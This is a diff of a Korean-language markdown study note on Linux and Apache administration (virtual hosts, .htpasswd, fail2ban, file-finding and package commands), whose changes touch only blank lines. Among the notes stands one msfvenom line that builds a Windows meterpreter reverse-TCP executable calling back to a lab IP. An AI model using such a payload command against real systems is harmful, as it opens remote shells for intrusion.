@@ -9,9 +9,9 @@ categories : unknown
 ## Virtual host: 하나의 도메인으로 여러 웹 사이트를 운영하는 기법
 ---
 필요조건 - 호스트가 하나거나 도메인이 하나인 경우에 여러 웹 사이트를 운영할 수 있다. (IP-based, Name-based, Port-based 기법 사용)
-
-
-
+  
+  
+  
 ---
 ### IP-based 실습
 ---
@@ -24,19 +24,19 @@ categories : unknown
  Allow from all
 </Directory>
 </VirtualHost>
-
-
-
+  
+  
+  
 ---
 ### Round Robin, Load Balancing, Fault Tolerance
 ---
 http://192.168.100.129 -> kahn.edu homepage
                    128 ->        "
                    127 ->        "
-
+  
 ---
-
-
+  
+  
 	* pid 관리 중요
 	* 랜섬웨어 관련 change root(fake!)
 	* sudo는 일시적으로 관리자로 변경
@@ -44,35 +44,35 @@ http://192.168.100.129 -> kahn.edu homepage
 	* selinux는 미 국방부에서 만든것, 고급보안임 (set uid.. sticky bit..)
 	* 설정을 다 했는데 인터넷 안되면 nslookup 명령어 
 	* echo는 저장된 설정이 있으면 보여줘라 or 파일 만드는 명령어 
-
-
+  
+  
 ---
 ## .htpasswd .htaccess
 ---
 > htpasswd -c /etc/httpd/conf/.htpasswd centos
 > htpasswd /etc/httpd/conf/.htpasswd ubuntu
-
-
+  
+  
 startx -> 그래픽으로 보여주는 명령어
 msfvenom -p windows/meterpreter/reverse tcp lhost=192.168.100.131 lport=1234 -f exe > /root/Desktop/shell.exe
-
-
-
+  
+  
+  
 ---
 ### 실시간으로 네트워크를 감시하는 명령어 
 ---
 tail -f option! 
 tail -f /var/log/syslog
-
+  
 백트랙의 해킹도구가 되는 근거는 바로 promiscuous mode
 SNMP 네트워크 모니터링 
-
+  
 *영원히 접근 못하게 막는 기법*
 jail2ban 
 fail2ban
-
-
-
+  
+  
+  
 ---
 ### 빈파일 만드는 명령어 
 ---
@@ -80,9 +80,9 @@ touch
 echo > 
 ex) touch xyz
 ex) echo > xyzz
-
-
-
+  
+  
+  
 ---
 ### 파일찾는 명령어
 ---
@@ -91,9 +91,9 @@ ex) echo > xyzz
 * which passwd (명령어를 찾을때는 which가 좋다)
 * whereis passwd (관리자들이 많이 쓴다)
 * find /home -type f -size 0 -exec ls -l {} \; (find 시작위치 type 타입 size 크기 exec 명령어)
-
-
-
+  
+  
+  
 ---
 ### dpkg -i
 ---
@@ -103,5 +103,6 @@ ex) echo > xyzz
 * dpkg -r abc로 삭제한다.
 * RedHat 계의의 Fedora, CentOS는 파일이 *.rpm,*.tar.gz, *.tar.bz2 이다. 
 * tar xvfz *.tar.gz tar xvfj *.tar.bz2해서 설치한다.
-
-
+  
+  
+  
